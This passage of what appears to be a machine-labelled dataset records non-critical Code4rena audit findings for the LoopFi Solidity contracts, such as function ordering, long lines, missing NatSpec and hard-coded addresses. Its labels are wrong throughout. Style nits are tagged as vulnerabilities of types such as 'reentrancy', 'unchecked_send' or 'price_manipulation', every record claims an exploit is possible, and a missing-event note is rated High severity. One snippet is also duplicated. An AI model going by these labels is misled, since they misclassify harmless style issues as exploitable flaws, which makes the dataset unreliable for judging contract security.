    "description": "This should especially be done if the new value is not required to be different from the old value *Instances (29)*: File: src/CDPVault.sol 195:     function setParameter(bytes32 parameter, uint256 data) external whenNotPaused onlyRole(VAULT_CONFIG_ROLE) { if (parameter == \"debtFloor\") vaultConfig.debtFloor = uint128(data);",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 85,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n1: \n   Current order:\n   internal _revertIfCallerIsNotPoolQuotaKeeper\n   internal _revertIfCallerNotCreditManager\n   internal _revertIfLocked\n   public decimals\n   external creditManagers\n   public availableLiquidity\n   public expectedLiquidity\n   public expectedLiquidityLU\n   public totalAssets\n   public deposit\n   external depositWithReferral\n   public mint\n   external mintWithReferral\n   public withdraw\n   public redeem\n   public previewDeposit\n   public previewMint\n   public previewWithdraw\n   public previewRedeem\n   public maxDeposit\n   public maxMint\n   public maxWithdraw\n   public maxRedeem\n   internal _deposit\n   internal _withdraw\n   internal _convertToShares\n   internal _convertToAssets\n   external totalBorrowed\n   external totalDebtLimit\n   external creditManagerBorrowed\n   external creditManagerDebtLimit\n   external creditManagerBorrowable\n   external lendCreditAccount\n   external repayCreditAccount\n   internal _borrowable\n   public baseInterestRate\n   external supplyRate\n   public baseInterestIndex\n   external baseInterestIndexLU\n   internal _calcBaseInterestAccrued\n   external calcAccruedQuotaInterest\n   internal _updateBaseInterest\n   private _calcBaseInterestAccrued\n   private _calcBaseInterestIndex\n   public quotaRevenue\n   external updateQuotaRevenue\n   external setQuotaRevenue\n   internal _calcQuotaRevenueAccrued\n   internal _setQuotaRevenue\n   private _calcQuotaRevenueAccrued\n   external setInterestRateModel\n   external setPoolQuotaKeeper\n   external setTotalDebtLimit\n   external setCreditManagerDebtLimit\n   external setWithdrawFee\n   external setAllowed\n   external setLock\n   external isAllowed\n   internal _setTotalDebtLimit\n   internal _amountWithFee\n   internal _amountMinusFee\n   internal _amountWithWithdrawalFee\n   internal _amountMinusWithdrawalFee\n   internal _convertToU256\n   internal _convertToU128\n   external mintProfit\n   \n   Suggested order:\n   external creditManagers\n   external depositWithReferral\n   external mintWithReferral\n   external totalBorrowed\n   external totalDebtLimit\n   external creditManagerBorrowed\n   external creditManagerDebtLimit\n   external creditManagerBorrowable\n   external lendCreditAccount\n   external repayCreditAccount\n   external supplyRate\n   external baseInterestIndexLU\n   external calcAccruedQuotaInterest\n   external updateQuotaRevenue\n   external setQuotaRevenue\n   external setInterestRateModel\n   external setPoolQuotaKeeper\n   external setTotalDebtLimit\n   external setCreditManagerDebtLimit\n   external setWithdrawFee\n   external setAllowed\n   external setLock\n   external isAllowed\n   external mintProfit\n   public decimals\n   public availableLiquidity\n   public expectedLiquidity\n   public expectedLiquidityLU\n   public totalAssets\n   public deposit\n   public mint\n   public withdraw\n   public redeem\n   public previewDeposit\n   public previewMint\n   public previewWithdraw\n   public previewRedeem\n   public maxDeposit\n   public maxMint\n   public maxWithdraw\n   public maxRedeem\n   public baseInterestRate\n   public baseInterestIndex\n   public quotaRevenue\n   internal _revertIfCallerIsNotPoolQuotaKeeper\n   internal _revertIfCallerNotCreditManager\n   internal _revertIfLocked\n   internal _deposit\n   internal _withdraw\n   internal _convertToShares\n   internal _convertToAssets\n   internal _borrowable\n   internal _calcBaseInterestAccrued\n   internal _updateBaseInterest\n   internal _calcQuotaRevenueAccrued\n   internal _setQuotaRevenue\n   internal _setTotalDebtLimit\n   internal _amountWithFee\n   internal _amountMinusFee\n   internal _amountWithWithdrawalFee\n   internal _amountMinusWithdrawalFee\n   internal _convertToU256\n   internal _convertToU128\n   private _calcBaseInterestAccrued\n   private _calcBaseInterestIndex\n   private _calcQuotaRevenueAccrued\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-15\"></a>[NC-15] Function ordering does not follow the Solidity style guide",
    "description": "According to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions), functions should be laid out in the following order :`constructor()`, `receive()`, `fallback()`, `external`, `public`, `internal`, `private`, but the cases below do not follow this pattern *Instances (17)*: File: src/CDPVault.sol 1: Current order:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 141,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/PoolV3.sol\n\n130:     function _revertIfCallerIsNotPoolQuotaKeeper() internal view {\n\n135:     function _revertIfCallerNotCreditManager() internal view {\n\n192:     function decimals() public view override(ERC20, ERC4626, IERC20Metadata) returns (uint8) {\n\n197:     function creditManagers() external view override returns (address[] memory) {\n\n202:     function availableLiquidity() public view override returns (uint256) {\n\n208:     function expectedLiquidity() public view override returns (uint256) {\n\n213:     function expectedLiquidityLU() public view override returns (uint256) {\n\n223:     function totalAssets() public view override(ERC4626, IERC4626) returns (uint256 assets) {\n\n336:     function previewDeposit(uint256 assets) public view override(ERC4626, IERC4626) returns (uint256 shares) {\n\n341:     function previewMint(uint256 shares) public view override(ERC4626, IERC4626) returns (uint256) {\n\n346:     function previewWithdraw(uint256 assets) public view override(ERC4626, IERC4626) returns (uint256) {\n\n351:     function previewRedeem(uint256 shares) public view override(ERC4626, IERC4626) returns (uint256) {\n\n356:     function maxDeposit(address) public view override(ERC4626, IERC4626) returns (uint256) {\n\n361:     function maxMint(address) public view override(ERC4626, IERC4626) returns (uint256) {\n\n366:     function maxWithdraw(address owner) public view override(ERC4626, IERC4626) returns (uint256) {\n\n376:     function maxRedeem(address owner) public view override(ERC4626, IERC4626) returns (uint256) {\n\n384:     function _deposit(address receiver, uint256 assetsSent, uint256 assetsReceived, uint256 shares) internal {\n\n429:     function _convertToShares(uint256 assets) internal pure returns (uint256 shares) {\n\n436:     function _convertToAssets(uint256 shares) internal pure returns (uint256 assets) {\n\n446:     function totalBorrowed() external view override returns (uint256) {\n\n451:     function totalDebtLimit() external view override returns (uint256) {\n\n456:     function creditManagerBorrowed(address creditManager) external view override returns (uint256) {\n\n461:     function creditManagerDebtLimit(address creditManager) external view override returns (uint256) {\n\n466:     function creditManagerBorrowable(address creditManager) external view override returns (uint256 borrowable) {\n\n579:     function _borrowable(DebtParams storage debt) internal view returns (uint256) {\n\n596:     function baseInterestRate() public view override returns (uint256) {\n\n603:     function supplyRate() external view override returns (uint256) {\n\n614:     function baseInterestIndex() public view override returns (uint256) {\n\n621:     function baseInterestIndexLU() external view override returns (uint256) {\n\n626:     function _calcBaseInterestAccrued() internal view returns (uint256) {\n\n632:     function calcAccruedQuotaInterest() external view returns (uint256) {\n\n671:     function _calcBaseInterestAccrued(uint256 timestamp) private view returns (uint256) {\n\n676:     function _calcBaseInterestIndex(uint256 timestamp) private view returns (uint256) {\n\n685:     function quotaRevenue() public view override returns (uint256) {\n\n717:     function _calcQuotaRevenueAccrued() internal view returns (uint256) {\n\n726:     function _setQuotaRevenue(uint256 newQuotaRevenue) internal {\n\n736:     function _calcQuotaRevenueAccrued(uint256 timestamp) private view returns (uint256) {\n\n838:     function setAllowed(address account, bool status) external controllerOnly {\n\n844:     function setLock(bool status) external controllerOnly {\n\n850:     function isAllowed(address account) external view returns (bool) {\n\n855:     function _setTotalDebtLimit(uint256 limit) internal {\n\n869:     function _amountWithFee(uint256 amount) internal view virtual returns (uint256) {\n\n875:     function _amountMinusFee(uint256 amount) internal view virtual returns (uint256) {\n\n880:     function _amountWithWithdrawalFee(uint256 amount) internal view returns (uint256) {\n\n885:     function _amountMinusWithdrawalFee(uint256 amount) internal view returns (uint256) {\n\n890:     function _convertToU256(uint128 limit) internal pure returns (uint256) {\n\n895:     function _convertToU128(uint256 limit) internal pure returns (uint128) {\n\n899:     function mintProfit(uint256 amount) external creditManagerOnly {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"NC-16\"></a>[NC-16] Functions should not be longer than 50 lines",
    "description": "Overly complex code can make understanding functionality more difficult, try to further modularize your code to ensure readability *Instances (270)*: File: src/CDPVault.sol 25:     function enter(address user, uint256 amount) external; 27:     function exit(address user, uint256 amount) external;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 100,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/vendor/IAuraPool.sol)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-19\"></a>[NC-19] Interfaces should be defined in separate files from their usage",
    "description": "The interfaces below should be defined in separate files, so that it's easier for future projects to import them, and to avoid duplication later on if they need to be used elsewhere in the project *Instances (3)*: File: src/CDPVault.sol 22: interface IPoolV3Loop is IPoolV3 { [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.099,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/quotas/PoolQuotaKeeperV3.sol\n\n183:     function updateRates()\n             external\n             override\n             gaugeOnly // U:[PQK-3]\n         {\n             address[] memory tokens = quotaTokensSet.values();\n             uint16[] memory rates = IGaugeV3(gauge).getRates(tokens); // U:[PQK-7]\n     \n             uint256 quotaRevenue; // U:[PQK-7]\n             uint256 timestampLU = lastQuotaRateUpdate;\n             uint256 len = tokens.length;\n     \n             for (uint256 i; i < len; ) {\n                 address token = tokens[i];\n                 uint16 rate = rates[i];\n     \n                 TokenQuotaParams storage tokenQuotaParams = totalQuotaParams[token]; // U:[PQK-7]\n                 (uint16 prevRate, uint192 tqCumulativeIndexLU, ) = _getTokenQuotaParamsOrRevert(tokenQuotaParams);\n     \n                 tokenQuotaParams.cumulativeIndexLU = QuotasLogic.cumulativeIndexSince(\n                     tqCumulativeIndexLU,\n                     prevRate,\n                     timestampLU\n                 ); // U:[PQK-7]\n     \n                 tokenQuotaParams.rate = rate; // U:[PQK-7]\n     \n                 quotaRevenue += (IPoolV3(pool).creditManagerBorrowed(creditManagers[token]) * rate) / PERCENTAGE_FACTOR; // U:[PQK-7]\n     \n                 emit UpdateTokenQuotaRate(token, rate); // U:[PQK-7]\n     \n                 unchecked {\n                     ++i;\n                 }\n             }\n     \n             IPoolV3(pool).setQuotaRevenue(quotaRevenue); // U:[PQK-7]\n             lastQuotaRateUpdate = uint40(block.timestamp); // U:[PQK-7]\n\n238:     function setCreditManager(\n             address token,\n             address vault\n         )\n             external\n             override\n             configuratorOnly // U:[PQK-2]\n         {\n             creditManagers[token] = vault;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"NC-20\"></a>[NC-20] Lack of checks in setters",
    "description": "Be it sanity checks (like checks against `0`-values) or initial setting checks: it's best for Setter functions to have them *Instances (16)*: File: src/PoolV3.sol 691:     function updateQuotaRevenue( int256 quotaRevenueDelta",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 53,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/quotas/GaugeV3.sol\n\n17: import {CallerNotVoterException, IncorrectParameterException, TokenNotAllowedException, InsufficientVotesException} from \"@gearbox-protocol/core-v3/contracts/interfaces/IExceptions.sol\";\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-21\"></a>[NC-21] Lines are too long",
    "description": "Usually lines in source code are limited to [80](https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width) characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over [164](https://github.com/aizatto/character-length) characters, the lines below should be split when they reach that length *Instances (1)*: File: src/quotas/GaugeV3.sol 17: import {CallerNotVoterException, IncorrectParameterException, TokenNotAllowedException, InsufficientVotesException} from \"@gearbox-protocol/core-v3/contracts/interfaces/IExceptions.sol\"; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/quotas/GaugeV3.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.231,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n266:     function setMinters(address[] calldata minters_) external onlyOwner {\n             uint256 length = minters_.length;\n             for (uint256 i; i < length; ) {\n                 if (minters_[i] == address(0)) revert AddressZero();\n                 minters[minters_[i]] = true;\n                 unchecked {\n                     i++;\n                 }\n             }\n             mintersAreSet = true;\n\n404:     function setDefaultRelockTypeIndex(uint256 index) external {\n             if (index >= _lockPeriod.length) revert InvalidType();\n             defaultLockIndex[msg.sender] = index;\n\n414:     function setAutocompound(bool status, uint256 slippage) external {\n             autocompoundEnabled[msg.sender] = status;\n             if (slippage < MAX_SLIPPAGE || slippage >= PERCENT_DIVISOR) {\n                 revert InvalidAmount();\n             }\n             userSlippage[msg.sender] = slippage;\n\n426:     function setUserSlippage(uint256 slippage) external {\n             if (slippage < MAX_SLIPPAGE || slippage >= PERCENT_DIVISOR) {\n                 revert InvalidAmount();\n             }\n             userSlippage[msg.sender] = slippage;\n\n452:     function setLookback(uint256 lookback) external onlyOwner {\n             if (lookback == uint256(0)) revert AmountZero();\n             if (lookback > rewardsDuration) revert InvalidLookback();\n     \n             rewardsLookback = lookback;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "<a name=\"NC-22\"></a>[NC-22] Missing Event for critical parameters change",
    "description": "Events help non-contract tools to track changes, and events prevent users from being surprised by changes. *Instances (18)*: File: src/PoolV3.sol 691:     function updateQuotaRevenue( int256 quotaRevenueDelta",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 38,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n185:     /// @notice Adds collateral to a CDP Vault\n         /// @param position The CDP Vault position\n         /// @param vault The CDP Vault\n         /// @param collateralParams The collateral parameters\n         function deposit(\n             address position,\n             address vault,\n             CollateralParams calldata collateralParams,\n             PermitParams calldata permitParams\n\n232:     /// @notice Adds collateral and debt to a CDP Vault\n         /// @param position The CDP Vault position\n         /// @param vault The CDP Vault\n         /// @param collateralParams The collateral parameters\n         /// @param creditParams The credit parameters\n         function depositAndBorrow(\n             address position,\n             address vault,\n             CollateralParams calldata collateralParams,\n             CreditParams calldata creditParams,\n             PermitParams calldata permitParams\n\n377:     /// @notice Callback function for the flash loan taken out in increaseLever\n         /// @param data The encoded bytes that were passed into the flash loan\n         function onFlashLoan(\n             address /*initiator*/,\n             address /*token*/,\n             uint256 amount,\n             uint256 fee,\n             bytes calldata data\n\n429:     /// @notice Callback function for the credit flash loan taken out in decreaseLever\n         /// @param data The encoded bytes that were passed into the credit flash loan\n         function onCreditFlashLoan(\n             address /*initiator*/,\n             uint256 /*amount*/,\n             uint256 /*fee*/,\n             bytes calldata data\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-24\"></a>[NC-24] Incomplete NatSpec: `@param` is missing on actually documented functions",
    "description": "The following functions are missing `@param` NatSpec comments. *Instances (12)*: File: src/PoolV3.sol 247:     /// @dev Same as `deposit`, but allows to specify the referral code function depositWithReferral(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 43,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/proxy/PositionAction.sol\n\n377:     /// @notice Callback function for the flash loan taken out in increaseLever\n         /// @param data The encoded bytes that were passed into the flash loan\n         function onFlashLoan(\n             address /*initiator*/,\n             address /*token*/,\n             uint256 amount,\n             uint256 fee,\n             bytes calldata data\n         ) external returns (bytes32) {\n\n429:     /// @notice Callback function for the credit flash loan taken out in decreaseLever\n         /// @param data The encoded bytes that were passed into the credit flash loan\n         function onCreditFlashLoan(\n             address /*initiator*/,\n             uint256 /*amount*/,\n             uint256 /*fee*/,\n             bytes calldata data\n         ) external returns (bytes32) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-25\"></a>[NC-25] Incomplete NatSpec: `@return` is missing on actually documented functions",
    "description": "The following functions are missing `@return` NatSpec comments. *Instances (9)*: File: src/PoolV3.sol 247:     /// @dev Same as `deposit`, but allows to specify the referral code function depositWithReferral(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 23,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.827,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n349:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n366:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n497:         if (!minters[msg.sender]) revert InsufficientPermission();\n\n690:         if (msg.sender != _lockZap) revert InsufficientPermission();\n\n726:         if (msg.sender != rewardConverter) revert InsufficientPermission();\n\n762:         requalifyFor(msg.sender);\n\n844:         if (msg.sender != address(bountyManager)) revert InsufficientPermission();\n\n1282:         if (onBehalfOf != msg.sender) revert InsufficientPermission();\n\n1357:         if (isRelockAction && address_ != msg.sender && _lockZap != msg.sender) revert InsufficientPermission();\n\n1369:         if (isRelockAction || (address_ != msg.sender && !autoRelockDisabled[address_])) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-27\"></a>[NC-27] Use a `modifier` instead of a `require/if` statement for a special `msg.sender` actor",
    "description": "If a function is supposed to be access-controlled, a `modifier` should be used instead of a `require/if` statement for more readability. *Instances (34)*: File: src/Flashlender.sol 101:         if (receiver.onFlashLoan(msg.sender, token, amount, fee, data) != CALLBACK_SUCCESS) 129:         if (receiver.onCreditFlashLoan(msg.sender, amount, fee, data) != CALLBACK_SUCCESS_CREDIT)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.853,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n87:     mapping(address => Balances) private _balances;\n\n88:     mapping(address => LockedBalance[]) internal _userLocks;\n\n89:     mapping(address => LockedBalance[]) private _userEarnings;\n\n90:     mapping(address => bool) public autocompoundEnabled;\n\n91:     mapping(address => uint256) public lastAutocompound;\n\n111:     mapping(address => Reward) public rewardData;\n\n114:     mapping(address => mapping(address => uint256)) public userRewardPerTokenPaid;\n\n117:     mapping(address => mapping(address => uint256)) public rewards;\n\n128:     mapping(address => bool) public minters;\n\n131:     mapping(address => bool) public autoRelockDisabled;\n\n134:     mapping(address => uint256) public defaultLockIndex;\n\n140:     mapping(address => uint256) public lastClaimTime;\n\n146:     mapping(address => uint256) public userSlippage;\n\n155:     mapping(address => bool) public isRewardToken;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"NC-29\"></a>[NC-29] Consider using named mappings",
    "description": "Consider moving to solidity version 0.8.18 or later, and using [named mappings](https://ethereum.stackexchange.com/questions/51629/how-to-name-the-arguments-in-mapping/145555#145555) to make it easier to understand the purpose of each mapping *Instances (33)*: File: src/CDPVault.sol 106:     mapping(address => Position) public positions; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 32,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.938,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/vendor/AuraVault.sol\n\n50:     address private constant BAL = 0xba100000625a3754423978a60c9317c58a424e3D;\n\n52:     address private constant BAL_CHAINLINK_FEED = 0xdF2917806E30300537aEB49A7663062F4d1F2b5F;\n\n55:     address private constant ETH_CHAINLINK_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;\n\n59:     address private constant AURA = 0xC0c293ce456fF0ED870ADd98a0828Dd4d2903DBF;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-30\"></a>[NC-30] `address`s shouldn't be hard-coded",
    "description": "It is often better to declare `address`es as `immutable`, and assign them via constructor arguments. This allows the code to remain the same across deployments on different networks, and avoids recompilation when addresses need to change. *Instances (5)*: File: src/proxy/TransferAction.sol 39:     address public constant permit2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3; [Link to code](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/proxy/TransferAction.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-07-loopfi",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.408,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/reward/MultiFeeDistribution.sol\n\n684:     /**\n          * @notice Zap vesting RDNT tokens to LP\n          * @param user address\n          * @return zapped amount\n          */\n         function zapVestingToLp(address user) external returns (uint256 zapped) {\n             if (msg.sender != _lockZap) revert InsufficientPermission();\n     \n             _updateReward(user);\n     \n             uint256 currentTimestamp = block.timestamp;\n             LockedBalance[] storage earnings = _userEarnings[user];\n             for (uint256 i = earnings.length; i > 0; ) {\n                 if (earnings[i - 1].unlockTime > currentTimestamp) {\n                     zapped = zapped + earnings[i - 1].amount;\n                     earnings.pop();\n                 } else {\n                     break;\n                 }\n                 unchecked {\n                     i--;\n                 }\n             }\n     \n             rdntToken.safeTransfer(_lockZap, zapped);\n     \n             Balances storage bal = _balances[user];\n             bal.earned = bal.earned - zapped;\n             bal.total = bal.total - zapped;\n     \n             IPriceProvider(_priceProvider).update();\n     \n             return zapped;\n\n836:     /**\n          * @notice Claims bounty.\n          * @dev Remove expired locks\n          * @param user address\n          * @param execute true if this is actual execution\n          * @return issueBaseBounty true if needs to issue base bounty\n          */\n         function claimBounty(address user, bool execute) public whenNotPaused returns (bool issueBaseBounty) {\n             if (msg.sender != address(bountyManager)) revert InsufficientPermission();\n     \n             (, uint256 unlockable, , , ) = lockedBalances(user);\n             if (unlockable == 0) {\n                 return (false);\n\n836:     /**\n          * @notice Claims bounty.\n          * @dev Remove expired locks\n          * @param user address\n          * @param execute true if this is actual execution\n          * @return issueBaseBounty true if needs to issue base bounty\n          */\n         function claimBounty(address user, bool execute) public whenNotPaused returns (bool issueBaseBounty) {\n             if (msg.sender != address(bountyManager)) revert InsufficientPermission();\n     \n             (, uint256 unlockable, , , ) = lockedBalances(user);\n             if (unlockable == 0) {\n                 return (false);\n             } else {\n                 issueBaseBounty = true;\n             }\n     \n             if (!execute) {\n                 return (issueBaseBounty);\n\n954:     /**\n          * @notice Earnings which are vesting, and earnings which have vested for full duration.\n          * @dev Earned balances may be withdrawn immediately, but will incur a penalty between 25-90%, based on a linear schedule of elapsed time.\n          * @return totalVesting sum of vesting tokens\n          * @return unlocked earnings\n          * @return earningsData which is an array of all infos\n          */\n         function earnedBalances(\n             address user\n         ) public view returns (uint256 totalVesting, uint256 unlocked, EarnedBalance[] memory earningsData) {\n             unlocked = _balances[user].unlocked;\n             LockedBalance[] storage earnings = _userEarnings[user];\n             uint256 idx;\n             uint256 length = earnings.length;\n             uint256 currentTimestamp = block.timestamp;\n             for (uint256 i; i < length; ) {\n                 if (earnings[i].unlockTime > currentTimestamp) {\n                     if (idx == 0) {\n                         earningsData = new EarnedBalance[](earnings.length - i);\n                     }\n                     (, uint256 penaltyAmount, , ) = _ieeWithdrawableBalance(user, earnings[i].unlockTime);\n                     earningsData[idx].amount = earnings[i].amount;\n                     earningsData[idx].unlockTime = earnings[i].unlockTime;\n                     earningsData[idx].penalty = penaltyAmount;\n                     idx++;\n                     totalVesting = totalVesting + earnings[i].amount;\n                 } else {\n                     unlocked = unlocked + earnings[i].amount;\n                 }\n                 unchecked {\n                     i++;\n                 }\n             }\n             return (totalVesting, unlocked, earningsData);\n\n990:     /**\n          * @notice Final balance received and penalty balance paid by user upon calling exit.\n          * @dev This is earnings, not locks.\n          * @param user address.\n          * @return amount total withdrawable amount.\n          * @return penaltyAmount penalty amount.\n          * @return burnAmount amount to burn.\n          */\n         function withdrawableBalance(\n             address user\n         ) public view returns (uint256 amount, uint256 penaltyAmount, uint256 burnAmount) {\n             uint256 earned = _balances[user].earned;\n             if (earned > 0) {\n                 uint256 length = _userEarnings[user].length;\n                 for (uint256 i; i < length; ) {\n                     uint256 earnedAmount = _userEarnings[user][i].amount;\n                     if (earnedAmount == 0) continue;\n                     (, , uint256 newPenaltyAmount, uint256 newBurnAmount) = _penaltyInfo(_userEarnings[user][i]);\n                     penaltyAmount = penaltyAmount + newPenaltyAmount;\n                     burnAmount = burnAmount + newBurnAmount;\n                     unchecked {\n                         i++;\n                     }\n                 }\n             }\n             amount = _balances[user].unlocked + earned - penaltyAmount;\n             return (amount, penaltyAmount, burnAmount);\n\n1044:     /**\n           * @notice Address and claimable amount of all reward tokens for the given account.\n           * @param account for rewards\n           * @return rewardsData array of rewards\n           */\n          function claimableRewards(address account) public view returns (IFeeDistribution.RewardData[] memory rewardsData) {\n              rewardsData = new IFeeDistribution.RewardData[](rewardTokens.length);\n      \n              uint256 length = rewardTokens.length;\n              for (uint256 i; i < length; ) {\n                  rewardsData[i].token = rewardTokens[i];\n                  rewardsData[i].amount =\n                      _earned(\n                          account,\n                          rewardsData[i].token,\n                          _balances[account].lockedWithMultiplier,\n                          rewardPerToken(rewardsData[i].token)\n                      ) /\n                      1e12;\n                  unchecked {\n                      i++;\n                  }\n              }\n              return rewardsData;\n\n1343:     /**\n           * @notice Withdraw all currently locked tokens where the unlock time has passed.\n           * @param address_ of the user.\n           * @param isRelockAction true if withdraw with relock\n           * @param doTransfer true to transfer tokens to user\n           * @param limit limit for looping operation\n           * @return amount for withdraw\n           */\n          function _withdrawExpiredLocksFor(\n              address address_,\n              bool isRelockAction,\n              bool doTransfer,\n              uint256 limit\n          ) internal whenNotPaused returns (uint256 amount) {\n              if (isRelockAction && address_ != msg.sender && _lockZap != msg.sender) revert InsufficientPermission();\n              _updateReward(address_);\n      \n              uint256 amountWithMultiplier;\n              Balances storage bal = _balances[address_];\n              (amount, amountWithMultiplier) = _cleanWithdrawableLocks(address_, limit);\n              bal.locked = bal.locked - amount;\n              bal.lockedWithMultiplier = bal.lockedWithMultiplier - amountWithMultiplier;\n              bal.total = bal.total - amount;\n              lockedSupply = lockedSupply - amount;\n              lockedSupplyWithMultiplier = lockedSupplyWithMultiplier - amountWithMultiplier;\n      \n              if (isRelockAction || (address_ != msg.sender && !autoRelockDisabled[address_])) {\n                  _stake(amount, address_, defaultLockIndex[address_], true);\n              } else {\n                  if 